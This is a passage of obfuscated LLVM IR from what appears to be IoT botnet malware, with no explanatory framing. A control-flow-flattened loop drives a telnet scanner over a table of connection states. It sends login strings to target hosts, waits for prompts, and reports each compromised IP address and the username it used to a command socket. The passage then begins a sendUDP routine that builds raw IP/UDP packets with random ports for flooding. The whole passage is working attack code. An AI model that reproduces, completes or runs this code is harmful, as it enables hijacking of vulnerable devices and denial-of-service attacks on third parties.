; <label>:1074:                                   ; preds = %loopEntry
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 8
  %1079 = load i8*, i8** %1078, align 8
  call void @llvm.memset.p0i8.i64(i8* %1079, i8 0, i64 1024, i32 1, i1 false)
  %1080 = load i32, i32* %2, align 4
  %1081 = sext i32 %1080 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 0
  %1084 = load i32, i32* %1083, align 16
  %1085 = call i32 @sclose(i32 %1084)
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 3
  store i8 1, i8* %1089, align 1
  %1090 = load i32, i32* %2, align 4
  %1091 = sext i32 %1090 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %1091
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1092, i32 0, i32 2
  store i8 0, i8* %1093, align 8
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 8
  %1099 = load i8*, i8** %1098, align 8
  %1100 = call i64 @strlen(i8* %1099) #10
  %1101 = trunc i64 %1100 to i16
  %1102 = load i32, i32* %2, align 4
  %1103 = sext i32 %1102 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 7
  store i16 %1101, i16* %1105, align 16
  store i32 -890013748, i32* %switchVar
  br label %loopEnd

; <label>:1106:                                   ; preds = %loopEntry
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 6
  %1111 = load i32, i32* %1110, align 4
  %1112 = add i32 %1111, 30
  %1113 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1114 = icmp ult i32 %1112, %1113
  %1115 = select i1 %1114, i32 1802785513, i32 -2057075470
  store i32 %1115, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  %1117 = load i32, i32* %2, align 4
  %1118 = sext i32 %1117 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 0
  %1121 = load i32, i32* %1120, align 16
  %1122 = call i32 @sclose(i32 %1121)
  %1123 = load i32, i32* %2, align 4
  %1124 = sext i32 %1123 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 2
  store i8 0, i8* %1126, align 8
  %1127 = load i32, i32* %2, align 4
  %1128 = sext i32 %1127 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %1128
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1129, i32 0, i32 3
  store i8 1, i8* %1130, align 1
  store i32 -2057075470, i32* %switchVar
  br label %loopEnd

; <label>:1131:                                   ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:1132:                                   ; preds = %loopEntry
  %1133 = load i32, i32* %2, align 4
  %1134 = sext i32 %1133 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 0
  %1137 = load i32, i32* %1136, align 16
  %1138 = call i64 @send(i32 %1137, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %1139 = icmp slt i64 %1138, 0
  %1140 = select i1 %1139, i32 -1603707163, i32 267634383
  store i32 %1140, i32* %switchVar
  br label %loopEnd

; <label>:1141:                                   ; preds = %loopEntry
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 0
  %1146 = load i32, i32* %1145, align 16
  %1147 = call i32 @sclose(i32 %1146)
  %1148 = load i32, i32* %2, align 4
  %1149 = sext i32 %1148 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 2
  store i8 0, i8* %1151, align 8
  %1152 = load i32, i32* %2, align 4
  %1153 = sext i32 %1152 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %1153
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1154, i32 0, i32 3
  store i8 1, i8* %1155, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1156:                                   ; preds = %loopEntry
  %1157 = load i32, i32* %2, align 4
  %1158 = sext i32 %1157 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %1158
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1159, i32 0, i32 2
  store i8 101, i8* %1160, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:1161:                                   ; preds = %loopEntry
  %1162 = load i32, i32* %2, align 4
  %1163 = sext i32 %1162 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 0
  %1166 = load i32, i32* %1165, align 16
  %1167 = call i64 @send(i32 %1166, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 282, i32 16384)
  %1168 = icmp slt i64 %1167, 0
  %1169 = select i1 %1168, i32 -1558147692, i32 -1242266771
  store i32 %1169, i32* %switchVar
  br label %loopEnd

; <label>:1170:                                   ; preds = %loopEntry
  %1171 = load i32, i32* %2, align 4
  %1172 = sext i32 %1171 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 0
  %1175 = load i32, i32* %1174, align 16
  %1176 = call i32 @sclose(i32 %1175)
  %1177 = load i32, i32* %2, align 4
  %1178 = sext i32 %1177 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %1178
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1179, i32 0, i32 2
  store i8 0, i8* %1180, align 8
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 3
  store i8 1, i8* %1184, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1185:                                   ; preds = %loopEntry
  %1186 = load i32, i32* %2, align 4
  %1187 = sext i32 %1186 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %1187
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1188, i32 0, i32 2
  store i8 102, i8* %1189, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:1190:                                   ; preds = %loopEntry
  %1191 = load i32, i32* %2, align 4
  %1192 = sext i32 %1191 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 16
  %1196 = call i64 @send(i32 %1195, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %1197 = icmp slt i64 %1196, 0
  %1198 = select i1 %1197, i32 -10435584, i32 -766350678
  store i32 %1198, i32* %switchVar
  br label %loopEnd

; <label>:1199:                                   ; preds = %loopEntry
  %1200 = load i32, i32* %2, align 4
  %1201 = sext i32 %1200 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %1201
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1202, i32 0, i32 0
  %1204 = load i32, i32* %1203, align 16
  %1205 = call i32 @sclose(i32 %1204)
  %1206 = load i32, i32* %2, align 4
  %1207 = sext i32 %1206 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1208, i32 0, i32 2
  store i8 0, i8* %1209, align 8
  %1210 = load i32, i32* %2, align 4
  %1211 = sext i32 %1210 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %1211
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1212, i32 0, i32 3
  store i8 1, i8* %1213, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1214:                                   ; preds = %loopEntry
  %1215 = load i32, i32* %2, align 4
  %1216 = sext i32 %1215 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %1216
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1217, i32 0, i32 2
  store i8 103, i8* %1218, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 6
  %1224 = load i32, i32* %1223, align 4
  %1225 = icmp eq i32 %1224, 0
  %1226 = select i1 %1225, i32 678000090, i32 1638880280
  store i32 %1226, i32* %switchVar
  br label %loopEnd

; <label>:1227:                                   ; preds = %loopEntry
  %1228 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1229 = load i32, i32* %2, align 4
  %1230 = sext i32 %1229 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 6
  store i32 %1228, i32* %1232, align 4
  store i32 1638880280, i32* %switchVar
  br label %loopEnd

; <label>:1233:                                   ; preds = %loopEntry
  %1234 = load i32, i32* %2, align 4
  %1235 = sext i32 %1234 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %1235
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1236, i32 0, i32 0
  %1238 = load i32, i32* %1237, align 16
  %1239 = load i32, i32* %2, align 4
  %1240 = sext i32 %1239 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %1240
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1241, i32 0, i32 8
  %1243 = load i8*, i8** %1242, align 8
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 7
  %1248 = load i16, i16* %1247, align 16
  %1249 = zext i16 %1248 to i32
  %1250 = call i32 @readUntil(i32 %1238, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1243, i32 1024, i32 %1249)
  %1251 = icmp ne i32 %1250, 0
  %1252 = select i1 %1251, i32 1012307721, i32 2130221053
  store i32 %1252, i32* %switchVar
  br label %loopEnd

; <label>:1253:                                   ; preds = %loopEntry
  %1254 = load i32, i32* %2, align 4
  %1255 = sext i32 %1254 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 6
  store i32 0, i32* %1257, align 4
  %1258 = load i32, i32* %2, align 4
  %1259 = sext i32 %1258 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 7
  store i16 0, i16* %1261, align 16
  %1262 = load i32, i32* @mainCommSock, align 4
  %1263 = load i32, i32* %2, align 4
  %1264 = sext i32 %1263 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 1
  %1267 = bitcast i32* %1266 to %struct.in_addr*
  %1268 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1267, i32 0, i32 0
  %1269 = load i32, i32* %1268, align 4
  %1270 = call i8* @inet_ntoa(i32 %1269) #4
  %1271 = load i32, i32* %2, align 4
  %1272 = sext i32 %1271 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 4
  %1275 = load i8, i8* %1274, align 2
  %1276 = zext i8 %1275 to i64
  %1277 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1276
  %1278 = load i8*, i8** %1277, align 8
  %1279 = call i32 (i32, i8*, ...) @sockprintf(i32 %1262, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* %1270, i8* %1278)
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 0
  %1284 = load i32, i32* %1283, align 16
  %1285 = call i32 @sclose(i32 %1284)
  %1286 = load i32, i32* %2, align 4
  %1287 = sext i32 %1286 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %1287
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1288, i32 0, i32 2
  store i8 0, i8* %1289, align 8
  %1290 = load i32, i32* %2, align 4
  %1291 = sext i32 %1290 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 8
  %1294 = load i8*, i8** %1293, align 8
  call void @llvm.memset.p0i8.i64(i8* %1294, i8 0, i64 1024, i32 1, i1 false)
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 3
  store i8 1, i8* %1298, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1299:                                   ; preds = %loopEntry
  %1300 = load i32, i32* %2, align 4
  %1301 = sext i32 %1300 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 8
  %1304 = load i8*, i8** %1303, align 8
  %1305 = call i64 @strlen(i8* %1304) #10
  %1306 = trunc i64 %1305 to i16
  %1307 = load i32, i32* %2, align 4
  %1308 = sext i32 %1307 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 7
  store i16 %1306, i16* %1310, align 16
  store i32 -1754265145, i32* %switchVar
  br label %loopEnd

; <label>:1311:                                   ; preds = %loopEntry
  %1312 = load i32, i32* %2, align 4
  %1313 = sext i32 %1312 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 6
  %1316 = load i32, i32* %1315, align 4
  %1317 = add i32 %1316, 30
  %1318 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1319 = icmp ult i32 %1317, %1318
  %1320 = select i1 %1319, i32 830659608, i32 -1253393951
  store i32 %1320, i32* %switchVar
  br label %loopEnd

; <label>:1321:                                   ; preds = %loopEntry
  %1322 = load i32, i32* %2, align 4
  %1323 = sext i32 %1322 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %1323
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1324, i32 0, i32 0
  %1326 = load i32, i32* %1325, align 16
  %1327 = call i32 @sclose(i32 %1326)
  %1328 = load i32, i32* %2, align 4
  %1329 = sext i32 %1328 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %1329
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 2
  store i8 0, i8* %1331, align 8
  %1332 = load i32, i32* %2, align 4
  %1333 = sext i32 %1332 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %1333
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1334, i32 0, i32 3
  store i8 1, i8* %1335, align 1
  store i32 -1253393951, i32* %switchVar
  br label %loopEnd

; <label>:1336:                                   ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:1337:                                   ; preds = %loopEntry
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:1338:                                   ; preds = %loopEntry
  %1339 = load i32, i32* %2, align 4
  %1340 = add nsw i32 %1339, 1
  store i32 %1340, i32* %2, align 4
  store i32 -1165950950, i32* %switchVar
  br label %loopEnd

; <label>:1341:                                   ; preds = %loopEntry
  store i32 -1051367995, i32* %switchVar
  br label %loopEnd

; <label>:1342:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %1341, %1338, %1337, %NewDefault, %1336, %1321, %1311, %1299, %1253, %1233, %1227, %1219, %1214, %1199, %1190, %1185, %1170, %1161, %1156, %1141, %1132, %1131, %1116, %1106, %1094, %1074, %1047, %1030, %1010, %1004, %996, %991, %976, %967, %962, %947, %938, %933, %918, %909, %908, %893, %883, %871, %865, %860, %840, %831, %811, %794, %774, %768, %760, %755, %740, %731, %716, %690, %689, %674, %664, %652, %637, %628, %622, %617, %612, %595, %575, %569, %561, %556, %541, %532, %517, %491, %490, %475, %465, %453, %435, %415, %409, %401, %400, %385, %375, %374, %359, %355, %354, %323, %308, %297, %265, %264, %255, %254, %248, %240, %239, %230, %219, %214, %191, %190, %165, %164, %159, %150, %139, %124, %104, %91, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %LeafBlock13, %NodeBlock15, %NodeBlock17, %NodeBlock19, %LeafBlock21, %NodeBlock23, %NodeBlock25, %NodeBlock27, %NodeBlock29, %67, %62, %61, %60, %59, %56, %41, %36, %22, %20, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1488207356, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1488207356, label %first
    i32 -1752774114, label %32
    i32 -1568186550, label %36
    i32 -928653415, label %41
    i32 1318323299, label %47
    i32 1687712117, label %48
    i32 1809470874, label %55
    i32 -343721153, label %60
    i32 -814083784, label %63
    i32 -175767412, label %71
    i32 -652304492, label %72
    i32 -1230428397, label %82
    i32 503425663, label %93
    i32 -1207045201, label %97
    i32 1647476704, label %101
    i32 1391594463, label %106
    i32 1153045478, label %107
    i32 -687888883, label %108
    i32 -1801760343, label %111
    i32 -1018415901, label %112
    i32 -1465803484, label %117
    i32 99152543, label %120
    i32 -838970730, label %126
    i32 1425534036, label %129
    i32 -284537136, label %130
    i32 -1754509082, label %135
    i32 -1019078104, label %140
    i32 1873002771, label %144
    i32 208604064, label %145
    i32 964414913, label %151
    i32 623396284, label %191
    i32 -968329286, label %193
    i32 -2069409956, label %198
    i32 550503646, label %223
    i32 -1663878033, label %224
    i32 -516359559, label %237
    i32 -1095606487, label %239
    i32 -1282968265, label %244
    i32 1294060347, label %271
    i32 1264943742, label %276
    i32 2050345541, label %277
    i32 -345608746, label %278
    i32 1456671346, label %281
    i32 -912643864, label %283
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 -1752774114, i32 -1568186550
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 -928653415, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 -928653415, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 1318323299, i32 1687712117
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -912643864, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 1809470874, i32 -1018415901
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #4
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -814083784, i32 -343721153
  store i32 %59, i32* %switchVar
  br label %loopEnd

